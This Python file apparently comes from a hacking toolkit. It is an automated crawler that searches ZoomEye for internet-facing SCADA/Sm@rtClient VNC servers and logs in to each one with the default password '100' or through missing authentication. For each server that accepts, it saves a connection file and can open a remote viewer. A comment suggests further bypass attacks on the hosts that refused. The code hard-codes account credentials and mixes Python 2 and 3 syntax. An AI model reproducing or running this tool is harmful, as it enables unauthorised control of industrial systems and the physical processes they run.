#
#
print ("""
#############################################################|
#------------------------------------------------------------|
#  SCADA/Sm@rtClient Auto VNC Vulnerability Crawler V.1.4.3  |
#------------------------------------------------------------|
#############################################################|
""")
#
#
###################################|
#----------------------------------|
# Coded and Compiled by LOOP & ONI |
#----------------------------------|
###################################|
#
# #####-------------------------------#####
# #####*** ZOOMEYE, GATHERING PART ***#####
# #####-------------------------------#####
#############################################
#############################################
#
#
import pyautogui
from twisted.python import usage, log
from twisted.internet import reactor, protocol
from twisted.internet.protocol import Factory, Protocol
import pygame
from pygame.locals import *
import sys, struct
import rfb
import inputbox
import warnings 
import time
from time import clock
import pprint
import sys
import json
import requests
import argparse
import signal
import multiprocessing.dummy as mp
from random import randint
import socket
import struct
import Crypto
import des
import cipher
import Crypto.Cipher
from Crypto.Cipher import DES

######## CHANGE THESE  (Or use `--email` and `--password` arguments) #########
USER_EMAIL = "scadahackingtool@gmail.com"
USER_PASSWORD = "scadahacker123"
##############################################################################

# general args var instead of using multiple vars
global args

# COLORS !!
RED = '\x1b[91m'
RED1 = '\033[31m'
BLUE = '\033[94m'
GREEN = '\033[32m'
BOLD = '\033[1m'
NORMAL = '\033[0m'
ENDC = '\033[0m'

# Safely stop the loops in case of CTRL+C
global interrputed
interrputed = False

# CTRL+C handling


def signal_handler(sig, frame):
	print(BLUE + '\n [*] You pressed Ctrl+C!')
	interrputed = True
	sys.exit(1)


signal.signal(signal.SIGINT, signal_handler)


# In case the ZoomEye API URL ever changes
API_URL = "https://api.zoomeye.org"


# Random UA since its required
def getRandomUserAgent():
	user_agents = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
				   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
				   "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
				   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
				   "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
				   "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
				   "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
				   "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
				   "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
				   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
				   "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36",
				   "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17",
				   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
				   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"]
	return user_agents[randint(0, len(user_agents) - 1)]


def getToken():
	print(BLUE + "[*] Logging in as "+args.email)
	headers = {
		'User-Agent': getRandomUserAgent()
	}

	USER_DATA = '{"username": ' + '"' + args.email + '"' + \
				', "password":  ' + '"' + args.password + '"' + '}'

	AUTH_REQUEST = requests.post(
		API_URL + '/user/login', data=USER_DATA, headers=headers)

	try:
		# Wrong credentials
		if(AUTH_REQUEST.status_code == 403):
			raise KeyError
		print("access token: " + AUTH_REQUEST.text)
		ACCESS_TOKEN = AUTH_REQUEST.json()['access_token']
		print(GREEN + "[+] Successfuly logged in")
		return ACCESS_TOKEN
	except KeyError:
		# This isn't supressed in quiet mode because there won't bay any results
		print(RED + "[-] Invalid Credentials, please specify an email and password either in this file or with `--email` and `--password` arguments")
		quit()


def detectSaveMode():
	global resultsFile
	if args.save:
		print(
			BLUE + "[*] All IPs will be saved to " + args.save)
		try:
			# Append file instead of replacing it
			resultsFile = open(args.save, 'a')
		except:
			print(
				RED + "[-] Could not write to " + args.save + ", please check your permissions")
			quit()
	else:
		print(
			BLUE + "[*] All IPs will be saved to " + "results.txt")
		try:
			# Append file instead of replacing it
			resultsFile = open("results.txt", 'a')
		except:
			print(
				RED + "[-] Could not write to " + "results.txt" + ", please check your permissions")
			quit()



def getPage(page):
	# This is the prefixed Token
	global TOKEN
	if not args.save:
		print(BLUE + "[*] Parsing page: " + str(page))
	else:
		# to keep the stdout clean
		print(BLUE + "[*] Parsing page: " + str(page), end=='\r')

	# Moved HEADERS and SEARCH since they are'nt really global

	# Add the prefixed token to the headers, and the user agent
	HEADERS = {"Authorization": TOKEN, "user-agent": getRandomUserAgent()}

	SEARCH = requests.get(API_URL + '/' + args.platform + '/search',
						  headers=HEADERS, params={"query": args.query, "page": page})
	response = json.loads(SEARCH.text)
	i = 0
	try:
		global output
		while i < len(response["matches"]):
			if(interrputed):
				break
			if args.platform == "host":
				if args.port:
					resultItem = response["matches"][i]["ip"] + ":" + \
						str(response["matches"][i]["portinfo"]["port"])
				else:
					resultItem = response["matches"][i]["ip"]

			elif args.platform == "web":
				if args.domain:
					resultItem = response["matches"][i]["site"]
				else:
					resultItem = response["matches"][i]["ip"][0]

			# output array
			output.append(resultItem)

			# clear the current line and print the result
		  
			print(resultItem)
			i += 1
	except IndexError:
		return
	except KeyError:
		print(RED + "[-] No hosts found")
		quit()


# Loopy loop or multithread
def getResult():
	# same output array
	global output
	output = []

	# Get the token, once
	global TOKEN
	TOKEN = "JWT " + getToken()

	# Basic multithreading
	if args.multi:
		p = mp.Pool(10)
		p.map(getPage, range(1, args.pages+1))
	else:
		currentPage = 1
		while currentPage <= args.pages:
			if(interrputed):
				break
			getPage(currentPage)
			currentPage += 1

	global resultsFile
	resultsFile.writelines(["%s\n" % item for item in output])
	


def ipCount():
	global output
	print(GREEN + "[+] " + str(len(output)) + " IPs saved to " + resultsFile.name)


def main():
	parser = argparse.ArgumentParser(
		description='Simple ZoomEye searcher, outputs IPs to stdout or file')

	parser.add_argument("-q", "--query", help="Your ZoomEye Search")
	parser.add_argument(
		"-m", "--multi", help="enable multithreading", action="store_true")
	parser.add_argument(
		"-p", "--pages", help="Number of pages to search (Default: 5)", type=int, default=5)
	parser.add_argument(
		"--email", help="Your ZoomEye email", default=USER_EMAIL)
	parser.add_argument(
		"--password", help="Your ZoomEye password", default=USER_PASSWORD)
	parser.add_argument(
		"-s", "--save", help="Save output to <file>, default file name: results.txt", nargs="?", type=str, const="results.txt")
	parser.add_argument("-pl", "--platform",
						help="Platforms to search, accepts \"host\" and \"web\" (Default: host)", default="host")
	parser.add_argument(
		"--port", help="Include the port number in the results (e.g., 127.0.0.1:1337) (Only for host platform)", action="store_true")
	parser.add_argument(
		"--domain", help="Output the site address rather than the IP. (Only for web platform)", action="store_true")

	global args
	args = parser.parse_args()

	detectSaveMode()
	getResult()


	ipCount()

	# The end
	print(ENDC)


if __name__ == '__main__':
	main()

##################################################################

# #####-------------------------------#####
# ##### *** Sm@rtClient VNC Check *** #####
# ##### **** ( VNC Brute Forcer) **** #####     
# #####-------------------------------#####
#############################################
#############################################
#
#
# return status
# status 0 = success ("none" authentication method)
# status 1 = success (good password)
# status 2 = bad password
# status 3 = bad configuration (wrong version, wrong security type)
# status 4 = bad connection
# status 5 = too many failures


#####################################################################
#####################################################################
#####################################################################


def vncviewer():
	POINTER = tuple([(8,8), (4,4)] + list(pygame.cursors.compile((
	#01234567
	"        ", #0
	"        ", #1
	"        ", #2
	"   .X.  ", #3
	"   X.X  ", #4
	"   .X.  ", #5
	"        ", #6
	"        ", #7
	), 'X', '.')))

	#keyboard mappings pygame -> vnc
	KEYMAPPINGS = {
	    K_BACKSPACE:        rfb.KEY_BackSpace,
	    K_TAB:              rfb.KEY_Tab,
	    K_RETURN:           rfb.KEY_Return,
	    K_ESCAPE:           rfb.KEY_Escape,
	    K_KP0:              rfb.KEY_KP_0,
	    K_KP1:              rfb.KEY_KP_1,
	    K_KP2:              rfb.KEY_KP_2,
	    K_KP3:              rfb.KEY_KP_3,
	    K_KP4:              rfb.KEY_KP_4,
	    K_KP5:              rfb.KEY_KP_5,
	    K_KP6:              rfb.KEY_KP_6,
	    K_KP7:              rfb.KEY_KP_7,
	    K_KP8:              rfb.KEY_KP_8,
	    K_KP9:              rfb.KEY_KP_9,
	    K_KP_ENTER:         rfb.KEY_KP_Enter,
	    K_UP:               rfb.KEY_Up,
	    K_DOWN:             rfb.KEY_Down,
	    K_RIGHT:            rfb.KEY_Right,
	    K_LEFT:             rfb.KEY_Left,
	    K_INSERT:           rfb.KEY_Insert,
	    K_DELETE:           rfb.KEY_Delete,
	    K_HOME:             rfb.KEY_Home,
	    K_END:              rfb.KEY_End,
	    K_PAGEUP:           rfb.KEY_PageUp,
	    K_PAGEDOWN:         rfb.KEY_PageDown,
	    K_F1:               rfb.KEY_F1,
	    K_F2:               rfb.KEY_F2,
	    K_F3:               rfb.KEY_F3,
	    K_F4:               rfb.KEY_F4,
	    K_F5:               rfb.KEY_F5,
	    K_F6:               rfb.KEY_F6,
	    K_F7:               rfb.KEY_F7,
	    K_F8:               rfb.KEY_F8,
	    K_F9:               rfb.KEY_F9,
	    K_F10:              rfb.KEY_F10,
	    K_F11:              rfb.KEY_F11,
	    K_F12:              rfb.KEY_F12,
	    K_F13:              rfb.KEY_F13,
	    K_F14:              rfb.KEY_F14,
	    K_F15:              rfb.KEY_F15,
	}

	MODIFIERS = {
	    K_NUMLOCK:          rfb.KEY_Num_Lock,
	    K_CAPSLOCK:         rfb.KEY_Caps_Lock,
	    K_SCROLLOCK:        rfb.KEY_Scroll_Lock,
	    K_RSHIFT:           rfb.KEY_ShiftRight,
	    K_LSHIFT:           rfb.KEY_ShiftLeft,
	    K_RCTRL:            rfb.KEY_ControlRight,
	    K_LCTRL:            rfb.KEY_ControlLeft,
	    K_RALT:             rfb.KEY_AltRight,
	    K_LALT:             rfb.KEY_AltLeft,
	    K_RMETA:            rfb.KEY_MetaRight,
	    K_LMETA:            rfb.KEY_MetaLeft,
	    K_LSUPER:           rfb.KEY_Super_L,
	    K_RSUPER:           rfb.KEY_Super_R,
	    K_MODE:             rfb.KEY_Hyper_R,        #???
	    #~ K_HELP:             rfb.
	    #~ K_PRINT:            rfb.
	    K_SYSREQ:           rfb.KEY_Sys_Req,
	    K_BREAK:            rfb.KEY_Pause,          #???
	    K_MENU:             rfb.KEY_Hyper_L,        #???
	    #~ K_POWER:            rfb.
	    #~ K_EURO:             rfb.
	}                        


	class TextSprite(pygame.sprite.Sprite):
	    """a text label"""
	    SIZE = 20
	    def __init__(self, pos, color = (255,0,0, 120)):
	        self.pos = pos
	        #self.containers = containers
	        #pygame.sprite.Sprite.__init__(self, self.containers)
	        pygame.sprite.Sprite.__init__(self)
	        self.font = pygame.font.Font(None, self.SIZE)
	        self.lastmsg = None
	        self.update()
	        self.rect = self.image.get_rect().move(pos)

	    def update(self, msg=' '):
	        if msg != self.lastmsg:
	            self.lastscore = msg
	            self.image = self.font.render(msg, 0, (255,255,255))


	#~ class PyGameApp(pb.Referenceable, Game.Game):
	class PyGameApp:
	    """Pygame main application"""
	    
	    def __init__(self):
	        width, height = 640, 480
	        self.setRFBSize(width, height)
	        pygame.display.set_caption('Python VNC Viewer')
	        pygame.mouse.set_cursor(*POINTER)
	        pygame.key.set_repeat(500, 30)
	        self.clock = pygame.time.Clock()
	        self.alive = 1
	        self.loopcounter = 0
	        self.sprites = pygame.sprite.RenderUpdates()
	        self.statustext = TextSprite((5, 0))
	        self.sprites.add(self.statustext)
	        self.buttons = 0
	        self.protocol = None
	        
	    def setRFBSize(self, width, height, depth=32):
	        """change screen size"""
	        self.width, self.height = width, height
	        self.area = Rect(0, 0, width, height)
	        winstyle = 0  # |FULLSCREEN
	        if depth == 32:
	            self.screen = pygame.display.set_mode(self.area.size, winstyle, 32)
	        elif depth == 8:
	            self.screen = pygame.display.set_mode(self.area.size, winstyle, 8)
	            #default palette is perfect ;-)
	            #~ pygame.display.set_palette([(x,x,x) for x in range(256)])
	        #~ elif depth is None:
	            #~ bestdepth = pygame.display.mode_ok((width, height), winstyle, 32)
	            #~ print "bestdepth %r" % bestdepth
	            #~ self.screen = pygame.display.set_mode(self.area.size, winstyle, best)
	            #then communicate that to the protocol...
	        else:
	            #~ self.screen = pygame.display.set_mode(self.area.size, winstyle, depth)
	            raise ValueError, "color depth not supported"
	        self.background = pygame.Surface((self.width, self.height), depth)
	        self.background.fill(0) #black

	    def setProtocol(self, protocol):
	        """attach a protocol instance to post the events to"""
	        self.protocol = protocol

	    def checkEvents(self):
	        """process events from the queue"""
	        seen_events = 0
	        for e in pygame.event.get():
	            seen_events = 1
	            #~ print e
	            if e.type == QUIT:
	                self.alive = 0
	                reactor.stop()
	            #~ elif e.type == KEYUP and e.key == K_ESCAPE:
	                #~ self.alive = 0
	                #~ reactor.stop()
	            if self.protocol is not None:
	                if e.type == KEYDOWN:
	                    if e.key in MODIFIERS:
	                        self.protocol.keyEvent(MODIFIERS[e.key], down=1)
	                    elif e.key in KEYMAPPINGS:
	                        self.protocol.keyEvent(KEYMAPPINGS[e.key])
	                    elif e.unicode:
	                        self.protocol.keyEvent(ord(e.unicode))
	                    else:
	                        print "warning: unknown key %r" % (e)
	                elif e.type == KEYUP:
	                    if e.key in MODIFIERS:
	                        self.protocol.keyEvent(MODIFIERS[e.key], down=0)
	                    #~ else:
	                        #~ print "unknown key %r" % (e)
	                elif e.type == MOUSEMOTION:
	                    self.buttons  = e.buttons[0] and 1
	                    self.buttons |= e.buttons[1] and 2
	                    self.buttons |= e.buttons[2] and 4
	                    self.protocol.pointerEvent(e.pos[0], e.pos[1], self.buttons)
	                    #~ print e.pos
	                elif e.type == MOUSEBUTTONUP:
	                    if e.button == 1: self.buttons &= ~1
	                    if e.button == 2: self.buttons &= ~2
	                    if e.button == 3: self.buttons &= ~4
	                    if e.button == 4: self.buttons &= ~8
	                    if e.button == 5: self.buttons &= ~16
	                    self.protocol.pointerEvent(e.pos[0], e.pos[1], self.buttons)
	                elif e.type == MOUSEBUTTONDOWN:
	                    if e.button == 1: self.buttons |= 1
	                    if e.button == 2: self.buttons |= 2
	                    if e.button == 3: self.buttons |= 4
	                    if e.button == 4: self.buttons |= 8
	                    if e.button == 5: self.buttons |= 16
	                    self.protocol.pointerEvent(e.pos[0], e.pos[1], self.buttons)
	            return not seen_events
	        return not seen_events

	    def mainloop(self, dum=None):
	        """gui 'mainloop', it is called repeated by twisteds mainloop 
	           by using callLater"""
	        #~ self.clock.tick()
	        no_work = self.checkEvents()

	        #~ self.sprites.clear(self.screen, self.background)
	        #~ dirty = self.sprites.draw(self.screen)
	        #~ pygame.display.update(dirty)
	        
	        #~ self.statustext.update("iteration %d" % self.loopcounter)
	        #~ self.loopcounter += 1
	        
	        #~ pygame.display.flip()
	        
	        if self.alive:
	            #~ d = defer.Deferred()
	            #~ d.addCallback(self.mainloop)
	            #~ d.callback(None)
	            reactor.callLater(no_work and 0.020, self.mainloop)
	    
	    #~ def error(self):
	        #~ log.msg('error, stopping reactor')
	        #~ reactor.stop()




	class RFBToGUI(rfb.RFBClient):
	    """RFBClient protocol that talks to the GUI app"""
	    
	    def vncConnectionMade(self):
	        """choose appropriate color depth, resize screen"""
	        #~ print "Screen format: depth=%d bytes_per_pixel=%r" % (self.depth, self.bpp)
	        #~ print "Desktop name: %r" % self.name

	        #~ print "redmax=%r, greenmax=%r, bluemax=%r" % (self.redmax, self.greenmax, self.bluemax)
	        #~ print "redshift=%r, greenshift=%r, blueshift=%r" % (self.redshift, self.greenshift, self.blueshift)

	        self.remoteframebuffer = self.factory.remoteframebuffer
	        self.screen = self.remoteframebuffer.screen
	        self.remoteframebuffer.setProtocol(self)
	        self.remoteframebuffer.setRFBSize(self.width, self.height, 32)
	        self.setEncodings(self.factory.encodings)
	        self.setPixelFormat()           #set up pixel format to 32 bits
	        self.framebufferUpdateRequest() #request initial screen update

	    def vncRequestPassword(self):
	        if self.factory.password is not None:
	            self.sendPassword(self.factory.password)
	        else:
	            #XXX hack, this is blocking twisted!!!!!!!
	            screen = pygame.display.set_mode((220,40))
	            screen.fill((255,100,0)) #redish bg
	            self.sendPassword(inputbox.ask(screen, "Password", password=1))
	    
	    #~ def beginUpdate(self):
	        #~ """start with a new series of display updates"""

	    def beginUpdate(self):
	        """begin series of display updates"""
	        #~ log.msg("screen lock")

	    def commitUpdate(self, rectangles = None):
	        """finish series of display updates"""
	        #~ log.msg("screen unlock")
	        pygame.display.update(rectangles)
	        self.framebufferUpdateRequest(incremental=1)

	    def updateRectangle(self, x, y, width, height, data):
	        """new bitmap data"""
	        #~ print "%s " * 5 % (x, y, width, height, len(data))
	        #~ log.msg("screen update")
	        self.screen.blit(
	            pygame.image.fromstring(data, (width, height), 'RGBX'),     #TODO color format
	            (x, y)
	        )

	    def copyRectangle(self, srcx, srcy, x, y, width, height):
	        """copy src rectangle -> destinantion"""
	        #~ print "copyrect", (srcx, srcy, x, y, width, height)
	        self.screen.blit(self.screen,
	            (x, y),
	            (srcx, srcy, width, height)
	        )

	    def fillRectangle(self, x, y, width, height, color):
	        """fill rectangle with one color"""
	        #~ remoteframebuffer.CopyRect(srcx, srcy, x, y, width, height)
	        self.screen.fill(struct.unpack("BBBB", color), (x, y, width, height))

	    def bell(self):
	        print "katsching"

	    def copy_text(self, text):
	        print "Clipboard: %r" % text

	#use a derrived class for other depths. hopefully with better performance
	#that a single class with complicated/dynamic color conversion.
	class RFBToGUIeightbits(RFBToGUI):
	    def vncConnectionMade(self):
	        """choose appropriate color depth, resize screen"""
	        self.remoteframebuffer = self.factory.remoteframebuffer
	        self.screen = self.remoteframebuffer.screen
	        self.remoteframebuffer.setProtocol(self)
	        self.remoteframebuffer.setRFBSize(self.width, self.height, 8)
	        self.setEncodings(self.factory.encodings)
	        self.setPixelFormat(bpp=8, depth=8, bigendian=0, truecolor=1,
	            redmax=7,   greenmax=7,   bluemax=3,
	            redshift=5, greenshift=2, blueshift=0
	        )
	        self.palette = self.screen.get_palette()
	        self.framebufferUpdateRequest()

	    def updateRectangle(self, x, y, width, height, data):
	        """new bitmap data"""
	        #~ print "%s " * 5 % (x, y, width, height, len(data))
	        #~ assert len(data) == width*height
	        bmp = pygame.image.fromstring(data, (width, height), 'P')
	        bmp.set_palette(self.palette)
	        self.screen.blit(bmp, (x, y))

	    def fillRectangle(self, x, y, width, height, color):
	        """fill rectangle with one color"""
	        self.screen.fill(ord(color), (x, y, width, height))

	class VNCFactory(rfb.RFBFactory):
	    """A factory for remote frame buffer connections."""
	    
	    def __init__(self, remoteframebuffer, depth, fast, *args, **kwargs):
	        rfb.RFBFactory.__init__(self, *args, **kwargs)
	        self.remoteframebuffer = remoteframebuffer
	        if depth == 32:
	            self.protocol = RFBToGUI
	        elif depth == 8:
	            self.protocol = RFBToGUIeightbits
	        else:
	            raise ValueError, "color depth not supported"
	            
	        if fast:
	            self.encodings = [
	                rfb.COPY_RECTANGLE_ENCODING,
	                rfb.RAW_ENCODING,
	            ]
	        else:
	            self.encodings = [
	                rfb.COPY_RECTANGLE_ENCODING,
	                rfb.HEXTILE_ENCODING,
	                rfb.CORRE_ENCODING,
	                rfb.RRE_ENCODING,
	                rfb.RAW_ENCODING,
	            ]


	    def buildProtocol(self, addr):
	        display = addr.port - 5900
	        pygame.display.set_caption('Python VNC Viewer on %s:%s' % (addr.host, display))
	        return rfb.RFBFactory.buildProtocol(self, addr)

	    def clientConnectionLost(self, connector, reason):
	        log.msg("connection lost: %r" % reason.getErrorMessage())
	        reactor.stop()

	    def clientConnectionFailed(self, connector, reason):
	        log.msg("cannot connect to server: %r\n" % reason.getErrorMessage())
	        reactor.stop()

	#class Options(usage.Options):
	  #  optParameters = ['passwordvnc', 'pvnc', '100', 'VNC password']

	  #      ['display',     'd', '0',               'VNC display'],
	   #     ['host',        'h', None,              'remote hostname'],
	    #    ['outfile',     'o', None,              'Logfile [default: sys.stdout]'],
	     
	      #  ['depth',       'D', '32',              'Color depth'],
	    #]
	    #optFlags = [
	     #   ['shared',      's',                    'Request shared session'],
	      #  ['fast',        'f',                    'Fast connection is used'],
	    #]

	#~ def eventcollector():
	    #~ while remoteframebuffer.alive:
	        #~ pygame.event.pump()
	        #~ e = pygame.event.poll()
	        #~ if e.type != NOEVENT:
	            #~ print e
	            #~ reactor.callFromThread(remoteframebuffer.processEvent, e)
	    #~ print 'xxxxxxxxxxxxx'

	def main2():
	    #o = Options()
	    #try:
	    #	o.parseOptions()
	    #except usage.UsageError, errortext:
	    #    print "%s: %s" % (sys.argv[0], errortext)
	     #   print "%s: Try --help for usage details." % (sys.argv[0])
	      #  raise SystemExit, 1

	    depth = int("32")

	    logFile = sys.stdout
	    #if o.opts['outfile']:
	     #   logFile = o.opts['outfile']
	    log.startLogging(logFile)
	    
	    pygame.init()
	    remoteframebuffer = PyGameApp()
	    
	    #~ from twisted.python import threadable
	    #~ threadable.init()
	    #~ reactor.callInThread(eventcollector)

	    host = (i)
	    passwordvnc=("100")
	    pvnc=("100")
	    p=("100")

	    display = int("0")
	    if host is None:
	        screen = pygame.display.set_mode((220,40))
	        screen.fill((0,100,255)) #blue bg
	        host = inputbox.ask(screen, "Host")
	        if host == '':
	            raise SystemExit
	        if ':' in host:
	            host, display = host.split(':')
	            if host == '':  host = 'localhost'
	            display = int(display)

	    # connect to this host and port, and reconnect if we get disconnected
	    reactor.connectTCP(
	        host,                                   #remote hostname
	        display + 5900,                         #TCP port number
	        VNCFactory(
	                remoteframebuffer,              #the application/display
	                depth,                          #color depth
	                passwordvnc,                 #if a fast connection is used
#	                passwordvnc,
#	                time.sleep(7)
#	                pyautogui.typewrite("100", interval=0.25)
#					pyautogui.press('enter')             #password or none
	                #int(o.opts['shared']),          #shared session flag
	        )
	    )
	    #pass

	    # run the application
	 #   reactor.callLater(0.1, remoteframebuffer.mainloop)
#	    reactor.run()


	if 1<2:
	    main2()

	#time.sleep(2)
	#pyautogui.typewrite((i), interval=0.25)
	#pyautogui.press('enter')
	#time.sleep(2)
	#pyautogui.typewrite("100", interval=0.25)
	#pyautogui.press('enter')

###############################################################
###############################################################
###############################################################

startingtime=clock()
def testvnc(server, port, password, timeout, verbose):
	try:
		ip = socket.gethostbyname(server)
	except socket.error as e:
		print "%s" % e
		return 4

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(timeout)
		s.connect((ip, port))
	except socket.error as e:
		print "Cannot connect to %s:%d" % (ip, port)
		print "%s" % e
		return 4
	print "Connected to %s:%d" % (server, port)


	# 11111
	# first, the server sends its RFB version, 12 bytes
	# more than 12 bytes if too many failures
	try:
		data = s.recv(1024)
	except socket.error as e:
		print "%s" % e
		return 4
		if verbose:
				print "Received [%d] version:\n%r" % (len(data), data)
	if len(data) > 12:
		return 5
	if data == "RFB 003.003\n":
		version = 3
	elif data == "RFB 003.007\n":
		version = 7
	elif data == "RFB 003.008\n":
		version = 8
	else:
		return 3
	print "RFB Version: 3.%d" % version



	# 22222
	# now, the client sends its RFB version, 12 bytes
	m = data
	if verbose:
		print "Sending [%d] version:\n%r" % (len(m), m)
	try:
		s.send(m)
	except socket.error as e:
		print "%s\n" % e
		return 4



	# 33333
	# now, the server sends the security type[s]
	# in version 3, the server deciDES the security type, 4 bytes
	# in version 3 using RealVNC, the server sends authentication type and challenge in one message, thus recv(4)
	# in version 7/8, the server sends a list of supported security types: number of security types of 1 byte followed by a list of security types of 1 byte each
	try:
		if version == 3:
			data = s.recv(4)
		else:
			data = s.recv(1024)
	except socket.error as e:
		print "%s" % e
		return 4
		if verbose:
				print "Received [%d] security type[s]:\n%r" % (len(data), data)

	if version == 3:
		security_type = struct.unpack("!I", data)[0]
		# security type 0 == Invalid
		# security type 1 == None
		# security type 2 == VNC
		if security_type == 1:
			return 0
		elif security_type != 2:
			return 3
	else:
		number_of_security_types = struct.unpack("!B", data[0])[0]
		if verbose:
			print "Number of security types: %d" % number_of_security_types
		if number_of_security_types == 0:
			# no security types supported
			return 3
		vnc_enabled = False
		for i in range(1, number_of_security_types + 1):
			if i >= len(data):
				# should not happen, but don't want to cause an exception
				break
			security_type = struct.unpack("!B", data[i])[0]
			# security type 1 = None
			# security type 2 = VNC
			# security type 16 = Tight
			# security type 18 = VNC
			# security type 19 = VeNCrypt
			# plus some more
			if security_type == 1:
				return 0
			elif security_type == 2:
				vnc_enabled = True
		if not vnc_enabled:
			print "VNC security type not supported"
			return 3



		# 44444
		# now, the client selects the VNC (2) security type, 1 byte
		m = struct.pack("!B", 2)
		if verbose:
			print "Sending [%d] security type:\n%r" % (len(m), m)
		try:
			s.send(m)
		except socket.error as e:
			print "%s\n" % e
			return 4


	# 55555
	# now, the server sends the authentication challenge, 16 bytes
	try:
		data = s.recv(16)
	except socket.error as e:
		print "%s" % e
		return 4

	challenge = struct.unpack("!16s", data)[0]
#		if verbose:
#				print "Received [%d] challenge:\n%r" % (len(challenge), challenge)



	# 66666
	# now, the client sends the response, 16 bytes
	key = calc_key(password)
	# encrypt 'challenge' using DES with 'key'
	cipher = DES.new(key, DES.MODE_ECB)
	response = cipher.encrypt(challenge)
	#if verbose:
	#	print "Sending [%d] response:\n%r" % (len(response), response)
	try:
		s.send(response)
	except socket.error as e:
		print "%s\n" % e
		return 4


	# 77777
	# last, the server sends an ok or fail
	# 0 == OK, 1 == failed
	try:
		data = s.recv(1024)
	except socket.error as e:
		print "%s" % e
		return 4
		if verbose:
				print "Received [%d] security result:\n%r" % (len(data), data)
	if len(data) == 0:
		result = struct.unpack("!0s", data[0:4])[0]
		if result == 0:
					# good password
			return 1
		elif result == 1:
			# bad password
			return 2
		else:
			# protocol error
			return 3
	else:
		result = struct.unpack("!I", data[0:4])[0]
		if result == 0:
			# good password
			return 1
		elif result == 1:
			# bad password
			return 2
		else:
		# protocol error
			return 3




def calc_key(password):
	key = password

	# first, pad the key with zeros to 8 bytes
	while len(key) < 8:
		key = key + "\x00"
	if len(key) > 8:
		key = key[:8]

	# second, flip all bytes individually
	flipped_key = ""
	for i in range(0 ,8):
		b = struct.unpack("B", key[i])[0]
		b_new = 0b00000000

		b_mask = 0b10000000
		bit = b & b_mask
		bit = bit >> 7
		b_new = b_new | bit

		b_mask = 0b01000000
		bit = b & b_mask
		bit = bit >> 5
		b_new = b_new | bit

		b_mask = 0b00100000
		bit = b & b_mask
		bit = bit >> 3
		b_new = b_new | bit

		b_mask = 0b00010000
		bit = b & b_mask
		bit = bit >> 1
		b_new = b_new | bit

		b_mask = 0b00001000
		bit = b & b_mask
		bit = bit << 1
		b_new = b_new | bit

		b_mask = 0b00000100
		bit = b & b_mask
		bit = bit << 3
		b_new = b_new | bit

		b_mask = 0b00000010
		bit = b & b_mask
		bit = bit << 5
		b_new = b_new | bit

		b_mask = 0b00000001
		bit = b & b_mask
		bit = bit << 7
		b_new = b_new | bit

		#print bin(b)
		#print bin(b_new)

		flipped_key = flipped_key + struct.pack("B", b_new)

	return flipped_key

def sacfiles():
        sacfiletype=open((i)+".sac", "w")
	sacfiletype.write("""[connection]
host=""" + (i) +"""
port=5900
password=7361719c6efd7676000000000000000000000000000000000000000000000000
[options]
use_encoding_0=1
use_encoding_1=1
use_encoding_2=1
use_encoding_3=0
use_encoding_4=1
use_encoding_5=1
use_encoding_6=1
use_encoding_7=1
use_encoding_8=1
preferred_encoding=7
restricted=0
viewonly=0
fullscreen=0
8bit=0
UseCursorKeyScroll=0
SuppressDeviceLayout=0
shared=1
swapmouse=0
belldeiconify=0
emulate3=0
emulate3timeout=100
emulate3fuzz=4
disableclipboard=0
localcursor=1
fitwindow=0
scale_den=1
scale_num=1
cursorshape=1
noremotecursor=0
compresslevel=-1
quality=6
""")

vncvieweryn=raw_input("Do you want to open servers with vncviewer [it can be slow down your PC] (y/n): ")

#def usage():
#	print "usage: %s SERVER PORT PASSWORD [TIMEOUT [VERBOSE]]" % sys.argv[0]
#	print "typical VNC ports are 5900, 5901, 5902..."

if __name__ == '__main__':
	if len(sys.argv) >= 0:
#		usage()
#	else:

		p=raw_input("page number: ")
		p=int(p)
		l=[]
		with open("results.txt", "r") as file:
			for x in file:
				l.append(x[:-1])
		t=0
		listnew=[]
		listauthfails=[]
		s=(p*20)
		while t<s:
                        for i in l:
                                #print t
				server = (i)
				port = int(5900)
				password = ("100")
				timeout = 10
				if len(sys.argv) >= 0:
					timeout = int(10)
				verbose = False
				if len(sys.argv) >= 6 and sys.argv[5].lower() == "true":
					verbose = True

		# status 0 = success (no authentication)
		# status 1 = success (good password)
		# status 2 = bad password
		# status 3 = bad configuration (wrong version, wrong security type)
		# status 4 = bad connection
		# status 5 = too many failures
				status = testvnc(server, port, password, timeout, verbose)
				if status == 0:	
					print "\"None\" authentication method detected"
					listnew.append(i)
					sacfiles()
					if vncvieweryn=="y" or vncvieweryn=="Y":
						print ("[*]vncviewer is starting...")
						time.sleep(2)
						vncviewer()
					else:
						print ("[*]vncviewer is not starting")
				elif status == 1:
					print "Authentication successful"
					listnew.append(i)
					sacfiles()
					if vncvieweryn=="y" or vncvieweryn=="Y":
						print ("[*]vncviewer is starting...")
						time.sleep(2)
						vncviewer()
						time.sleep(30)
						pass
						
					else:
						print ("[*]vncviewer is not starting")

				elif status == 2:
				#you can use bypassing attack with those failed IP addresses
					print "Authentication failed"
					listauthfails.append(i)
				elif status == 3:
					print "Protocol error"
				elif status == 4:
					print "Network error"
